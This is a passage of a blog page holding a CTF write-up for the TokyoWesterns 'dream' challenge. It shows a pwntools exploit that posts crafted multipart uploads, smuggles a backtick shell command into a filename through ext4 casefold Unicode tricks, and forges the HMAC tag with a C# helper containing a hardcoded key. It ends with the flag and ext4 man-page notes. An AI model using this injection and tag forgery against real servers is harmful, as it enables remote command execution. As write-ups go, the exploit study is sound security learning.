+/wEMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMwDjJWVIJvIW8qNp8fjXqX3h5GVcJ5o5Yra9F5KfHb
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="file1"; filename="test"
+Content-Type: application/octet-stream
+
+/get_flag2
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="filename1"
+
+{}
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="button1"
+
+Upload
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="uploadedFilename"
+
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="uploadedFilenameTag"
+
+xvvJTvo9RYTqWsgJMNLZLiEwoJ4eF5uR/hCW+FgYp6Y=
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5
+Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+/wEdAAEAAAD/////AQAAAAAAAAAPAQAAAAUAAAAIyd/IalikKYp4o/TJEB6bjEPD+b8LAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOTyO0VpwYzoHI+eXiWfAGvnzmaoGBHm77uPr8qGQH1E
+------WebKitFormBoundaryZiSaf9FJ6PtAeIM5--'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">filename</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="s">' '</span><span class="o">*</span><span class="mi">100</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+<span class="k">def</span> <span class="nf">compress</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'dream.chal.ctf.westerns.tokyo'</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">u'''POST /upload.aspx HTTP/1.1
+Host: dream.chal.ctf.westerns.tokyo
+Connection: keep-alive
+Content-Length: 1730
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://dream.chal.ctf.westerns.tokyo
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycTTUhLx8GPsIrRrB
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://dream.chal.ctf.westerns.tokyo/upload.aspx
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en-US;q=0.9,en;q=0.8,ko-KR;q=0.7
+Cookie: ASP.NET_SessionId=AEDE0033A82E6358B8C052CA
+
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="__VIEWSTATE"
+
+/wEMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMwDjJWVIJvIW8qNp8fjXqX3h5GVcJ5o5Yra9F5KfHb
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="file1"; filename=""
+Content-Type: application/octet-stream
+
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="filename1"
+
+test
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="uploadedFilename"
+
+{filename}
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="uploadedFilenameTag"
+
+{tag}
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="button2"
+
+Compress
+------WebKitFormBoundarycTTUhLx8GPsIrRrB
+Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+/wEdAAEAAAD/////AQAAAAAAAAAPAQAAAAUAAAAIyd/IalikKYp4o/TJEB6bjEPD+b8LAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOTyO0VpwYzoHI+eXiWfAGvnzmaoGBHm77uPr8qGQH1E
+------WebKitFormBoundarycTTUhLx8GPsIrRrB--'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">,</span> <span class="n">tag</span><span class="o">=</span><span class="n">tag</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="s">' '</span><span class="o">*</span><span class="mi">100</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">upload</span><span class="p">(</span><span class="s">"</span><span class="se">\u0338</span><span class="s">a"</span><span class="p">)</span>
+<span class="n">upload</span><span class="p">(</span><span class="s">"</span><span class="se">\u1FEF</span><span class="s">sh</span><span class="se">\u226E</span><span class="s">a</span><span class="se">\u226F</span><span class="s">b</span><span class="se">\u1FEF</span><span class="s">"</span><span class="p">)</span>
+<span class="n">compress</span><span class="p">(</span><span class="s">"`sh&lt;</span><span class="se">\u0338</span><span class="s">a&gt;</span><span class="se">\u0338</span><span class="s">b`"</span><span class="p">,</span> <span class="s">"u15vKcAnJTc0p2SSfYLqs7XQzuSZfIj+uikBQ2S7lmc="</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>FLAG : <code class="highlighter-rouge">TWCTF{c0e7d10abe93c98ec4c3025b498cd383_ext4_casefold+web_server=vuln!}</code></p>
+
+<h3 id="appendix-1---hmac-구하는-코드">Appendix #1 - hmac 구하는 코드</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Configuration</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Collections</span><span class="p">.</span><span class="n">Generic</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Linq</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">RegularExpressions</span><span class="p">;</span>
+
+<span class="n">namespace</span> <span class="n">Rextester</span>
+<span class="p">{</span>
+
+    <span class="n">public</span> <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+			<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"</span><span class="se">\u1FEF</span><span class="s">sh&lt;</span><span class="se">\u0338</span><span class="s">a&gt;</span><span class="se">\u0338</span><span class="s">b</span><span class="se">\u1FEF</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">GenerateHmac</span><span class="p">(</span><span class="s">"</span><span class="se">\u1FEF</span><span class="s">sh&lt;</span><span class="se">\u0338</span><span class="s">a&gt;</span><span class="se">\u0338</span><span class="s">b</span><span class="se">\u1FEF</span><span class="s">"</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="n">private</span> <span class="n">static</span> <span class="n">string</span> <span class="n">keyEncryptionKeyHex</span> <span class="o">=</span>
+            <span class="s">"aabad0f0a8fefae3eb8b032ab0c99627"</span><span class="p">;</span>
+
+        <span class="n">private</span> <span class="n">static</span> <span class="nb">int</span> <span class="n">HexdigitToInteger</span><span class="p">(</span><span class="n">char</span> <span class="n">c</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="s">'0'</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'9'</span><span class="p">)</span>
+                <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="s">'0'</span><span class="p">;</span>
+            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="s">'a'</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'f'</span><span class="p">)</span>
+                <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="s">'a'</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
+            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="s">'A'</span> <span class="o">&lt;=</span> <span class="n">c</span> <span class="o">&amp;&amp;</span> <span class="n">c</span> <span class="o">&lt;=</span> <span class="s">'F'</span><span class="p">)</span>
+                <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="s">'A'</span> <span class="o">+</span> <span class="mi">10</span><span class="p">;</span>
+            <span class="k">else</span>
+                <span class="n">throw</span> <span class="n">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">"Invalid hex"</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">private</span> <span class="n">static</span> <span class="n">char</span> <span class="n">IntegerToHexdigit</span><span class="p">(</span><span class="nb">int</span> <span class="n">x</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="mi">16</span><span class="p">)</span>
+                <span class="n">throw</span> <span class="n">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">"Out of range"</span><span class="p">);</span>
+            <span class="k">else</span>
+                <span class="k">return</span> <span class="s">"0123456789abcdef"</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
+        <span class="p">}</span>
+
+        <span class="n">private</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">HexToBytes</span><span class="p">(</span><span class="n">string</span> <span class="nb">hex</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">hex</span><span class="p">.</span><span class="n">Length</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">throw</span> <span class="n">new</span> <span class="n">ArgumentException</span><span class="p">(</span><span class="s">"Invalid hex"</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">byte</span><span class="p">[]</span> <span class="n">result</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="nb">hex</span><span class="p">.</span><span class="n">Length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">];</span>
+            <span class="k">for</span> <span class="p">(</span><span class="nb">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">result</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">)((</span><span class="n">HexdigitToInteger</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span>
+                                <span class="n">HexdigitToInteger</span><span class="p">(</span><span class="nb">hex</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]));</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">private</span> <span class="n">static</span> <span class="n">string</span> <span class="n">BytesToHex</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">data</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">var</span> <span class="n">result</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+            <span class="n">foreach</span> <span class="p">(</span><span class="n">var</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">result</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">IntegerToHexdigit</span><span class="p">(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">));</span>
+                <span class="n">result</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">IntegerToHexdigit</span><span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">));</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="n">result</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="n">protected</span> <span class="n">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">DecryptKey</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">encryptedKey</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">var</span> <span class="n">keyEncryptionKey</span> <span class="o">=</span> <span class="n">HexToBytes</span><span class="p">(</span><span class="n">keyEncryptionKeyHex</span><span class="p">);</span>
+            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">aes</span> <span class="o">=</span> <span class="n">new</span> <span class="n">AesManaged</span><span class="p">())</span> <span class="p">{</span>
+                <span class="n">aes</span><span class="p">.</span><span class="n">BlockSize</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
+                <span class="n">aes</span><span class="p">.</span><span class="n">KeySize</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
+                <span class="n">aes</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">ECB</span><span class="p">;</span>
+                <span class="n">aes</span><span class="p">.</span><span class="n">Padding</span> <span class="o">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="bp">None</span><span class="p">;</span>
+                <span class="n">aes</span><span class="p">.</span><span class="n">Key</span> <span class="o">=</span> <span class="n">keyEncryptionKey</span><span class="p">;</span>
+                <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">decryptor</span> <span class="o">=</span> <span class="n">aes</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">())</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="n">decryptor</span><span class="p">.</span><span class="n">TransformFinalBlock</span><span class="p">(</span><span class="n">encryptedKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="n">protected</span> <span class="n">static</span> <span class="n">string</span> <span class="n">GenerateHmac</span><span class="p">(</span><span class="n">string</span> <span class="n">data</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">var</span> <span class="n">encryptedHmacKeyHex</span> <span class="o">=</span> <span class="s">"5af42f71a1b864b7d2093336013508f8"</span><span class="p">;</span>
+            <span class="n">var</span> <span class="n">encryptedHmacKey</span> <span class="o">=</span> <span class="n">HexToBytes</span><span class="p">(</span><span class="n">encryptedHmacKeyHex</span><span class="p">);</span>
+            <span class="n">var</span> <span class="n">hmacKey</span> <span class="o">=</span> <span class="n">DecryptKey</span><span class="p">(</span><span class="n">encryptedHmacKey</span><span class="p">);</span>
+
+            <span class="n">var</span> <span class="n">dataBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+            <span class="n">using</span> <span class="p">(</span><span class="n">var</span> <span class="n">hmac</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HMACSHA256</span><span class="p">(</span><span class="n">hmacKey</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">var</span> <span class="n">tagBytes</span> <span class="o">=</span> <span class="n">hmac</span><span class="p">.</span><span class="n">ComputeHash</span><span class="p">(</span><span class="n">dataBytes</span><span class="p">);</span>
+                <span class="n">var</span> <span class="n">tagString</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">ToBase64String</span><span class="p">(</span><span class="n">tagBytes</span><span class="p">);</span>
+                <span class="k">return</span> <span class="n">tagString</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="appendix-2---ext4-linux-manual-page">Appendix #2 - ext4 linux manual page</h3>
+
+<p><a href="https://man7.org/linux/man-pages/man5/ext4.5.html">ext4(5) - Linux manual page</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>casefold
+              This ext4 feature provides file system level character
+              encoding support for directories with the casefold (+F) flag
+              enabled.  This feature is name-preserving on the disk, but it
+              allows applications to lookup for a file in the file system
+              using an encoding equivalent version of the file name.
+</code></pre></div></div>
+
+<p><a href="https://man7.org/linux/man-pages/man1/chattr.1.html">chattr(1) - Linux manual page</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The letters 'aAcCdDeFijPsStTu' select the new attributes for the
+       files: append only (a), no atime updates (A), compressed (c), no copy
+       on write (C), no dump (d), synchronous directory updates (D), extent
+       format (e), case-insensitive directory lookups (F), immutable (i),
+       data journalling (j), project hierarchy (P), secure deletion (s),
+       synchronous updates (S), no tail-merging (t), top of directory
+       hierarchy (T), and undeletable (u).
+</code></pre></div></div>
+
+   </div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+   <a href="/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b" class="left arrow">&#8592;</a>
+  
+  
+   <a href="/2020-10-01/Cheat-Engine-DBVM-8b5aa7dc092c4dd2b81b7d4696266309" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2020-10-13 11:20:23 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
